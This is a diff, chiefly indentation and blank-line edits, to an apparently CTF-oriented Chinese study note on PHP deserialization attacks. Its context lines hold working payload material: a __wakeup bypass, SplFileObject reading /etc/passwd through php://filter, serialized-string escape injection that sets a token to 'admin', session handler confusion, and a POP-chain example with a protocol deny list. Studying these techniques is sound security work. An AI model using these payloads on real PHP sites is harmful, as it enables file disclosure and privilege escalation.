@@ -53,13 +53,15 @@ str_replace('O:', 'O:+',$a);
 
 例如：
 if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user']))
-	$user = unserialize($_COOKIE['user']);       
+    $user = unserialize($_COOKIE['user']);       
 ```
 
+绕过wakeup函数
 
 ```
-修改反序列化串的对象属性个数（一般大于原个数），绕过wakeup函数
+修改反序列化串的对象属性个数（一般大于原个数），
 ```
+
 [PHP反序列化中wakeup()绕过总结 – fushulingのblog](https://fushuling.com/index.php/2023/03/11/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%adwakeup%e7%bb%95%e8%bf%87%e6%80%bb%e7%bb%93/)
 
 ## 原生类的反序列化
@@ -85,6 +87,7 @@ echo urlencode($b);
 ```
 
 SplFileObject只能读文件只能读取第一行的内容，可以使用php伪协议读取base64后的内容
+
 ```
 $a = new SplFileObject("php://filter/read=convert.base64-encode/resource=/etc/passwd");  <br>echo $a;
 ```
@@ -113,9 +116,9 @@ class message{
         $this->msg = $m;
         $this->to = $t;
     }
-	public function __destruct(){
-		file_put_contents('877.php','<?php phpinfo()?>;');
-	}
+    public function __destruct(){
+        file_put_contents('877.php','<?php phpinfo()?>;');
+    }
 }
 
 $a=new message('1','2','fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}');
@@ -128,7 +131,6 @@ echo strlen('loverloverloverloverloverloverloverloverloverloverloverloverloverlo
 
 序列化串：
 O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:135:"loverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverloverlover";s:5:"token";s:5:"admin";}";s:5:"token";s:4:"user";}
-
 ```
 
 ## session序列化
@@ -136,7 +138,9 @@ O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:135:"loverlover
 ```
 关于session和cookie，建议都用bp而不用hackbar，不同cookie之间用;分隔
 ```
+
 [PHP session反序列化漏洞原理解析 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/324519.html)
+
 ```
 文件先以php_serialize处理器(a:1:{s:4:"name";s:6:"harden";})，而其它的页面以默认php处理器(name|s:6:"harden";)来存储session数据，于是我们便可构造payload,其中漏洞为php处理器会将'|'之后的反序列化
 
@@ -175,14 +179,14 @@ $str = new f4ke();
 
 ```php
 通过魔术方法，先找到头和尾，逐步分析
-    
+
 例题：
 <?php
 class A{
   public $var_1;
-  
+
   public function __invoke(){
-	  echo 'a';
+      echo 'a';
    include($this->var_1);
   }
 }
@@ -191,7 +195,7 @@ class B{
   public $q;
   public function __wakeup()
 {
-	  echo 'b';
+      echo 'b';
   if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->q)) {
             echo "hacker";           
         }
@@ -202,7 +206,7 @@ class C{
   public $var;
   public $z;
     public function __toString(){
-		echo 'c';
+        echo 'c';
         return $this->z->var;
     }
 }
@@ -211,7 +215,7 @@ class D{
   public $p;
     public function __get($key){
         $function = $this->p;
-		echo 'd';
+        echo 'd';
         return $function();
     }  
 }
@@ -254,7 +258,6 @@ echo serialize($a),"<br/>";
 echo urlencode(serialize($a)),'<br/>';
 echo $a->password,$a->token;
 ?>
-
 ```
 
 ## 特性
@@ -265,4 +268,3 @@ echo $a->password,$a->token;
 
 大小写绕过,当对象名被正则时，可以试试大小写，一般是不敏感（除非设置i）
 ```
-
